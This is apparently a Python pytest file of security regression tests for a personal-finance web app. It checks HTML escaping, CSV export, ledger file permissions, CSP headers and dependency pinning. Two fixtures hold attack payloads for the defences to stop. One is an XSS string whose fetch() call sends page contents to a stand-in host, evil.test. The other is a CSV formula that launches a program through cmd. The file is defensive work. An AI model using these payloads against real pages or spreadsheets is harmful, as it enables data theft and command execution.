"""Security regressions. Written before the fixes.

Every case here was **demonstrated against the running code** before it was
written down, not inferred from a pattern. Two of them share a source: issuer
names come from AMC disclosure files fetched over the internet, so a hostile or
compromised disclosure is remote input that reaches a local page and a local
spreadsheet. That is the only untrusted-input path this project has, and it is
the one worth testing.

`src/m1_ledger/` is test-first by `CLAUDE.md`, which covers the ledger file-mode
case below.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import stat
import sys
from datetime import date
from decimal import Decimal
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from src.common.decimals import connect
from src.common.types import IssuerId, SchemeId, UserId
from src.m0_data.schema.apply import apply_migrations
from src.m1_ledger.db import apply_ledger_schema, connect_ledger
from src.m3_lookthrough.engine import IssuerWeight, Position, compute_lookthrough
from src.m3_lookthrough.persist import save_lookthrough
from src.m6_views.api.app import create_app
from src.m6_views.registry import seed_view_definitions

USER = "USER-01"
AS_OF = date(2026, 9, 4)
JULY = date(2026, 7, 31)
S1 = SchemeId("S1")

#: A disclosure file supplies an instrument name; resolution turns it into an
#: issuer and `canonical_name` keeps it verbatim. Both payloads below are what
#: an attacker would put there.
XSS_NAME = (
    '</script><img src=x onerror="fetch(\'//evil.test/?d=\'+document.body.innerHTML)">'
)
FORMULA_NAME = "=cmd|'/c calc.exe'!A1"


def _client(tmp_path: Path, issuer_name: str) -> TestClient:
    warehouse_db = str(tmp_path / "w.db")
    apply_migrations(warehouse_db)
    warehouse = connect(warehouse_db, check_same_thread=False)
    warehouse.execute(
        "INSERT OR REPLACE INTO issuer (issuer_id, canonical_name, is_listed)"
        " VALUES (?,?,1)",
        ("EVIL", issuer_name),
    )
    warehouse.commit()
    seed_view_definitions(warehouse)

    ledger = connect_ledger(
        str(tmp_path / "p.db"), key="test-key", check_same_thread=False
    )
    apply_ledger_schema(ledger)
    result = compute_lookthrough(
        [Position(S1, Decimal("100000"))],
        {S1: [IssuerWeight(IssuerId("EVIL"), Decimal("100"), "equity")]},
        AS_OF,
    )
    save_lookthrough(ledger, UserId(USER), AS_OF, result, {S1: JULY})
    return TestClient(create_app(ledger, warehouse))


QS = f"?user_id={USER}&as_of={AS_OF.isoformat()}"


# --- the script block ---------------------------------------------------------


def test_an_issuer_name_cannot_close_the_json_script_block(tmp_path: Path) -> None:
    """`json.dumps` escapes quotes and backslashes. It does NOT escape `<` or
    `/`, so `</script>` inside a string terminated the element and everything
    after it parsed as HTML.

    Demonstrated before the fix: the served page contained
    `</script><img src=x onerror=...>` and the image tag was live in the
    document, same-origin with `/api/*` — so it could read the whole portfolio
    and post it anywhere.
    """
    client = _client(tmp_path, XSS_NAME)
    html = client.get(f"/view/lookthrough_sankey{QS}").text

    # Counted, not matched. A non-greedy regex stops at the INJECTED terminator
    # and inspects the clean JSON in front of it — which is how the first
    # version of this test passed against vulnerable code. If the payload
    # closed the element, the document carries one more `</script>` than it has
    # opening tags.
    assert html.count("<script") == html.count("</script>")
    assert "</script><img" not in html
    # The string `onerror=` DOES appear, inside Jinja's escaped rendering of the
    # same name in the accessible table — `&lt;img src=x onerror=&#34;...`. That
    # is the escaping working, so the property to assert is that no LIVE tag was
    # produced, not that the characters are absent.
    assert "<img src=x" not in html


def test_the_escaped_payload_is_still_the_same_data(tmp_path: Path) -> None:
    """The fix must not corrupt what it protects. `\\u003c` is the same
    character to a JSON parser, so the browser reads the original name."""
    client = _client(tmp_path, XSS_NAME)
    html = client.get(f"/view/lookthrough_sankey{QS}").text
    block = re.search(r'<script id="sankey-data"[^>]*>(.*?)</script>', html, re.S)
    assert block

    payload = json.loads(block.group(1))
    labels = [n["label"] for n in payload["nodes"]]
    assert XSS_NAME in labels, "the escaping changed the data, not just its encoding"


def test_the_visible_label_is_html_escaped_too(tmp_path: Path) -> None:
    """Jinja autoescapes `{{ }}`, so the accessible table under the diagram is
    already safe. Asserted rather than assumed — it is the same string reaching
    a second sink."""
    client = _client(tmp_path, XSS_NAME)
    html = client.get(f"/view/lookthrough_sankey{QS}").text
    assert "&lt;/script&gt;" in html or "&lt;img" in html
    assert "<img src=x" not in html


# --- the CSV ------------------------------------------------------------------


def test_a_formula_cannot_lead_a_csv_cell(tmp_path: Path) -> None:
    """The export writes a UTF-8 BOM specifically so Excel opens it natively,
    which is the exact configuration CSV injection targets.

    Demonstrated before the fix, written unquoted and unprefixed:
        S1,EVIL,=cmd|'/c calc.exe'!A1,100000
    """
    client = _client(tmp_path, FORMULA_NAME)
    body = client.get(f"/api/export/lookthrough_sankey.csv{QS}").text

    rows = [
        line
        for line in body.lstrip("﻿").splitlines()
        if line and not line.startswith("#") and not line.startswith("scheme_id")
    ]
    assert rows, "nothing exported, so this proves nothing"
    for row in rows:
        for cell in row.split(","):
            bare = cell.strip().strip('"')
            assert not bare.startswith(("=", "+", "@", "\t", "\r")), cell


def test_a_negative_number_is_still_a_negative_number(tmp_path: Path) -> None:
    """`-` leads a formula AND every negative figure in this product. Neutering
    it blindly would turn a short position into text, so the guard must look at
    what follows."""
    from src.m6_views.export.csv import _cell

    assert _cell(Decimal("-1234.56")) == "-1234.56"
    assert _cell(Decimal("0")) == "0"
    assert _cell("Reliance Industries Ltd.") == "Reliance Industries Ltd."
    # And the dangerous forms are defanged.
    assert _cell("=1+1").startswith("'")
    assert _cell("-1+1").startswith("'")
    assert _cell("@SUM(A1)").startswith("'")


# --- the ledger file ----------------------------------------------------------


@pytest.mark.skipif(
    sys.platform == "win32",
    reason="Windows os.chmod only toggles the read-only bit; POSIX modes do not apply",
)
def test_the_ledger_is_not_readable_by_other_accounts(tmp_path: Path) -> None:
    """Measured before the fix: mode 0666. The contents are encrypted, so this
    is depth rather than disclosure — but an encrypted blob every local account
    can copy is an offline-attack target, and `allow_unencrypted=True` produces
    a PLAINTEXT ledger with the same mode."""
    path = tmp_path / "personal.db"
    conn = connect_ledger(str(path), key="test-key")
    apply_ledger_schema(conn)
    conn.close()

    mode = stat.S_IMODE(os.stat(path).st_mode)
    assert mode == 0o600, f"ledger created {oct(mode)}, expected 0o600"


def test_tightening_the_mode_never_breaks_the_open(tmp_path: Path) -> None:
    """Runs everywhere, including Windows: whatever the platform does with the
    permission bits, the ledger must still open and round-trip."""
    path = tmp_path / "personal.db"
    conn = connect_ledger(str(path), key="test-key")
    apply_ledger_schema(conn)
    conn.close()

    again = connect_ledger(str(path), key="test-key")
    assert again.execute("SELECT count(*) FROM position").fetchone()[0] == 0


# --- response headers ---------------------------------------------------------


@pytest.mark.parametrize("path", ["/", "/view/lookthrough_sankey", "/api/views"])
def test_every_response_carries_a_content_security_policy(
    tmp_path: Path, path: str
) -> None:
    """A CSP of `script-src 'self'` blocks the injected-image payload above even
    if the escaping regressed. Two independent defences, because the input is
    remote and the page holds the whole portfolio."""
    client = _client(tmp_path, "Acme Ltd.")
    headers = client.get(f"{path}{QS}").headers

    csp = headers.get("content-security-policy", "")
    assert "default-src 'self'" in csp
    assert "script-src 'self'" in csp
    assert "frame-ancestors 'none'" in csp
    assert headers.get("x-content-type-options") == "nosniff"
    assert headers.get("referrer-policy") == "no-referrer"


def test_the_csp_still_allows_the_vendored_d3(tmp_path: Path) -> None:
    """`script-src 'self'` must not block the scripts the page actually needs —
    a policy that breaks the flagship chart would be reverted within a day."""
    client = _client(tmp_path, "Acme Ltd.")
    html = client.get(f"/view/lookthrough_sankey{QS}").text
    assert '<script src="/static/vendor/d3.v7.min.js"></script>' in html
    assert client.get("/static/vendor/d3.v7.min.js").status_code == 200


# --- vendored third-party code ------------------------------------------------

VENDOR = Path(__file__).resolve().parents[2] / "src" / "m6_views" / "static" / "vendor"


def test_the_vendored_javascript_matches_its_recorded_hashes() -> None:
    """d3 is committed to this repository rather than loaded from a CDN, which
    removes a third party from every page load and replaces it with a question:
    is the copy in the tree the one that was reviewed?

    `SHA256SUMS` answers it. A swapped file fails here rather than silently
    running in the page that renders someone's finances.
    """
    sums = VENDOR / "SHA256SUMS"
    assert sums.exists(), "no integrity record for the vendored JavaScript"

    recorded = {}
    for line in sums.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        digest, name = line.split(None, 1)
        recorded[name.strip()] = digest

    on_disk = sorted(p.name for p in VENDOR.glob("*.js"))
    assert on_disk, "no vendored JavaScript found"
    assert sorted(recorded) == on_disk, "SHA256SUMS and the directory disagree"

    for name, digest in recorded.items():
        actual = hashlib.sha256((VENDOR / name).read_bytes()).hexdigest()
        assert actual == digest, f"{name} does not match its recorded hash"


# --- packaging ----------------------------------------------------------------


def test_every_third_party_import_is_declared() -> None:
    """`pdfplumber` and `pypdf` were imported by `cas/pdf.py` and declared
    nowhere, so `pip install -e .` followed by `python -m jobs.import_cas` — the
    workflow the README documents — failed with ImportError.

    They are deliberately imported inside the function so the ledger stays
    importable without them, which is a reason to make them an OPTIONAL
    dependency, not a reason to leave them undeclared.
    """
    import tomllib

    root = Path(__file__).resolve().parents[2]
    with open(root / "pyproject.toml", "rb") as fh:
        meta = tomllib.load(fh)["project"]

    declared = set()
    for spec in meta.get("dependencies", []):
        declared.add(re.split(r"[<>=~!\[ ]", spec, maxsplit=1)[0].lower())
    for group in meta.get("optional-dependencies", {}).values():
        for spec in group:
            declared.add(re.split(r"[<>=~!\[ ]", spec, maxsplit=1)[0].lower())

    for package in ("pypdf", "pdfplumber", "openpyxl", "httpx", "fastapi", "jinja2"):
        assert package in declared, f"{package} is imported but not declared"


def test_every_dependency_is_pinned_exactly() -> None:
    """A lower bound is not enough. It lets a fresh clone install whatever
    shipped that morning, so the gate certifies a program nobody has run —
    which is not a theory: CI resolved a newer FastAPI stack than this machine
    had and failed the type check on it."""
    for spec in _declared_dependencies():
        assert "==" in spec, f"{spec} is not pinned to a single version"


def _declared_dependencies() -> list[str]:
    """Every dependency `pyproject.toml` names, extras included."""
    import tomllib

    root = Path(__file__).resolve().parents[2]
    with open(root / "pyproject.toml", "rb") as fh:
        meta = tomllib.load(fh)["project"]
    specs = list(meta.get("dependencies", []))
    for group in meta.get("optional-dependencies", {}).values():
        specs.extend(group)
    assert specs
    return specs


def _normalise(name: str) -> str:
    """PEP 503: `PyYAML`, `pyyaml` and `py_yaml` are one project, and a lock
    file written by `pip freeze` does not use the spelling `pyproject.toml`
    happens to use."""
    return re.sub("[-_.]+", "-", name).lower()


def test_the_lock_pins_what_pyproject_cannot() -> None:
    """`pyproject.toml` can only pin the packages it names, and the one that
    broke CI was **starlette** — which it never names, because starlette
    arrives underneath FastAPI. Pinning the direct dependencies and stopping
    there would have left the actual cause free to move again."""
    root = Path(__file__).resolve().parents[2]
    lock = (root / "requirements.lock").read_text(encoding="utf-8")

    pinned: dict[str, str] = {}
    for raw in lock.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        assert "==" in line, f"lock entry is not an exact pin: {line}"
        name, _, version = line.partition("==")
        pinned[_normalise(name)] = version

    declared = _declared_dependencies()
    for spec in declared:
        name = _normalise(spec.split("==")[0])
        assert name in pinned, f"{name} is declared but missing from the lock"

    assert "starlette" in pinned, "the package that caused this is unpinned again"
    assert len(pinned) > len(declared), (
        "a lock that covers only the declared dependencies is not a lock"
    )


def test_the_temp_directory_helper_is_not_used_for_secrets() -> None:
    """A sanity check on the one thing that would undo `import_cas` writing
    nothing: no module that touches a password may also write a temp file."""
    pdf = (
        Path(__file__).resolve().parents[2] / "src" / "m1_ledger" / "cas" / "pdf.py"
    ).read_text(encoding="utf-8")
    # `pdfplumber.open(buffer)` reads an in-memory BytesIO and is fine, so the
    # list names the calls that would put bytes on a disk.
    for forbidden in (
        "NamedTemporaryFile", "mkstemp", "mkdtemp", "write_bytes", "write_text",
        "gettempdir",
    ):
        assert forbidden not in pdf, f"{forbidden} in the module that holds a password"
